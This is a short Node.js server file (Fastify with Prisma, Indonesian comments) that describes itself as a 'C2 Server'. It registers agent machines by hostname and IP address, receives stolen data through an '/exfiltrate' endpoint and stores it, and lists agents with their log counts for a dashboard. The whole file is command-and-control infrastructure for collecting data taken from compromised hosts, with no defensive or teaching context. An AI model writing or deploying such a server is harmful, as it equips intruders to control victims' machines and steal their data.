const fastify = require("fastify")({ logger: true });
const { PrismaClient } = require("@prisma/client");
const prisma = new PrismaClient();

// Registrasi Agent
fastify.post("/register", async (request, reply) => {
  const { hostname, ip_address } = request.body;
  return await prisma.agent.upsert({
    where: { hostname },
    update: { last_seen: new Date() },
    create: { hostname, ip_address },
  });
});

// Terima Data Exfiltration
fastify.post("/exfiltrate", async (request, reply) => {
  const { hostname, type, content } = request.body;
  return await prisma.log.create({
    data: { type, content, agentHostname: hostname },
  });
});

// API untuk Dashboard (Ambil semua data)
fastify.get("/agents", async () => {
  return await prisma.agent.findMany({
    include: { _count: { select: { logs: true } } },
  });
});

fastify.listen({ port: 8000 }, (err) => {
  if (err) throw err;
  console.log("C2 Server running on port 8000");
});
